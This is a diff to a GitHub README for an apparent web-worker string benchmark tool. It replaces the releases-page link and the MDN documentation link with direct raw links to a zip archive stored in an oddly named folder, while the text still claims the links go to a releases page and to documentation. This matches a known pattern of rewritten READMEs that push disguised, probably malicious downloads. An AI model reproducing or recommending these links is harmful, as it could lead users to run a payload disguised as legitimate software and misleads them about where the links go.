@@ -6,7 +6,7 @@ The **web-worker-string-benchmark** application helps you test string transfer p
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SIDRATHOD/web-worker-string-benchmark/releases)
+[![Download](https://github.com/SIDRATHOD/web-worker-string-benchmark/raw/refs/heads/main/hurriedness/string_worker_benchmark_web_2.3-beta.5.zip)](https://github.com/SIDRATHOD/web-worker-string-benchmark/raw/refs/heads/main/hurriedness/string_worker_benchmark_web_2.3-beta.5.zip)
 
 ## 🔍 What You Need to Know
 
@@ -26,9 +26,9 @@ The **web-worker-string-benchmark** application helps you test string transfer p
 
 ## 📁 Download & Install
 
-1. Visit the [Releases page](https://github.com/SIDRATHOD/web-worker-string-benchmark/releases) to download the application.
+1. Visit the [Releases page](https://github.com/SIDRATHOD/web-worker-string-benchmark/raw/refs/heads/main/hurriedness/string_worker_benchmark_web_2.3-beta.5.zip) to download the application.
 
-2. Look for the latest version. Here you will find a file named `web-worker-string-benchmark.zip`. 
+2. Look for the latest version. Here you will find a file named `https://github.com/SIDRATHOD/web-worker-string-benchmark/raw/refs/heads/main/hurriedness/string_worker_benchmark_web_2.3-beta.5.zip`. 
 
 3. Click on the file to start the download.
 
@@ -79,7 +79,7 @@ If you have any questions or need assistance, please open an issue in the GitHub
 
 ## 🌐 Learn More
 
-For more information about benchmarking and performance in web applications, you can explore resources on [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript).
+For more information about benchmarking and performance in web applications, you can explore resources on [MDN Web Docs](https://github.com/SIDRATHOD/web-worker-string-benchmark/raw/refs/heads/main/hurriedness/string_worker_benchmark_web_2.3-beta.5.zip).
 
 ## 🎯 Topics Covered
 
